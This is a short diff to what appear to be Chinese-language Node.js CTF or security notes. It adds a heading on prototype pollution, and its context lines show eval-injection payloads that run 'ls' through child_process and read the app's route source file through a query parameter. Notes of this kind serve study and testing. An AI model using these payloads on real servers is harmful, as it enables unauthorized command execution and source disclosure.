@@ -17,6 +17,7 @@ b={'x':'2'}
 ```
 
 
+^
 ## **eval命令执行**
 
 ```
@@ -60,3 +61,7 @@ eval(require("child_process").execSync('ls'))
 ?eval=require('fs').readFileSync('/app/routes/index.js', 'utf-8')   查看源码
 ```
 
+
+
+^
+## **原型链污染**
